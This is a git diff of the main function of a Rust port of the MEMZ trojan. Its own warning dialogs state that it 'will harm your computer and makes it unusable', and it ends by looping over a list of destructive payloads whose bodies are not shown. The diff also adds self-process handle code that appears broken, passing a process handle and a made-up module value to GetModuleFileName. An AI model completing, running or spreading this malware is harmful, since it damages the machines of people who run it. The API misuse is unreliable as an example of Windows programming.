@@ -19,7 +19,7 @@ use std::{
     mem::size_of,
     process,
     thread::{self, sleep},
-    time::Duration,
+    time::Duration, ptr,
 };
 use windows::{
     core::PCSTR,
@@ -36,7 +36,7 @@ use windows::{
         },
         System::{
             Diagnostics::ToolHelp::{Process32First, PROCESSENTRY32},
-            Threading::{OpenProcess, HIGH_PRIORITY_CLASS, PROCESS_QUERY_INFORMATION},
+            Threading::{OpenProcess, HIGH_PRIORITY_CLASS, PROCESS_QUERY_INFORMATION, GetCurrentProcessId, PROCESS_QUERY_LIMITED_INFORMATION},
         },
         UI::{
             Shell::{SEE_MASK_NOCLOSEPROCESS, SHELLEXECUTEINFOA},
@@ -46,7 +46,7 @@ use windows::{
                 SM_CYSCREEN, SW_SHOWDEFAULT, WINDOW_EX_STYLE, WINDOW_STYLE, WNDCLASSEXA,
             },
         },
-    },
+    }, s,
 };
 
 fn main() -> Result<(), WinError> {
@@ -126,16 +126,47 @@ fn main() -> Result<(), WinError> {
             };
         }
     } else {
-        if wrap_messagebox_a(HWND(0), MEMZ_MSGBOXA_1, "MEMZ", MB_YESNO | MB_ICONWARNING)? != IDYES
-            || wrap_messagebox_a(HWND(0), MEMZ_MSGBOXA_2, "MEMZ", MB_YESNO | MB_ICONWARNING)?
+        if wrap_messagebox_a(HWND(0), s!("The software you just executed is considered malware.\r\n\
+        This malware will harm your computer and makes it unusable.\r\n\
+        If you are seeing this message without knowing what you just executed, simply press No and nothing will happen.\r\n\
+        If you know what this malware does and are using a safe environment to test, \
+        press Yes to start it.\r\n\r\n\
+        DO YOU WANT TO EXECUTE THIS MALWARE, RESULTING IN AN UNUSABLE MACHINE?"), "MEMZ", MB_YESNO | MB_ICONWARNING)? != IDYES
+            || wrap_messagebox_a(HWND(0), s!("THIS IS THE LAST WARNING!\r\n\r\n\
+            THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS MALWARE!\r\n\
+            STILL EXECUTE IT?"), "MEMZ", MB_YESNO | MB_ICONWARNING)?
                 != IDYES
         {
             process::exit(0);
         }
 
+        let pid = unsafe {
+            GetCurrentProcessId()
+        };
+
+        let handle;
+        unsafe {
+            handle = match OpenProcess(
+                PROCESS_QUERY_LIMITED_INFORMATION, // Permission Denined: PROCESS_QUERY_INFORMATION
+                FALSE,
+                pid,
+            ) {
+                Ok(handle) => Some(handle),
+                Err(e) => {
+                    let data = "OpenProcessError: The target process is running with administrator privileges or is a protected process.";
+                    write_log(
+                        LogType::ERROR,
+                        LogLocation::ALL,
+                        &format!("{}\n{}\n", data, dbg!(&e)),
+                    );
+                    None
+                }
+            };
+        }
+
         let mut fn_buf = vec![LMEM_ZEROINIT; 16384]; // alloc 8192 * 2
         wrap_get_module_file_name(
-            HANDLE::default(),
+            handle.unwrap(),
             HMODULE(8192_isize),
             fn_buf.as_mut_slice(),
         )?;
@@ -253,8 +284,6 @@ fn main() -> Result<(), WinError> {
         PCSTR::null(),
         SW_SHOWDEFAULT,
     )?;
-
-    dbg!();
 
     for payload in PAYLOADS.iter().take(N_PAYLOADS) {
         sleep(Duration::from_millis(payload.delay as u64));
